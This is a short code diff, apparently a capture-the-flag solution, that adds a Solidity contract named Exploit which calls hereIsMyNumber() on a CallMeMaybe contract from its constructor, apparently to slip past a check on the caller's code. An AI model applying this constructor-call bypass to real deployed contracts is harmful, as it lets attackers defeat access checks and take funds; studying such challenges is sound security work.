@@ -26,3 +26,9 @@ contract CallMeMaybe {
         }
     }
 }
+
+contract Exploit {
+    constructor(CallMeMaybe instance) {
+        instance.hereIsMyNumber();
+    }
+}
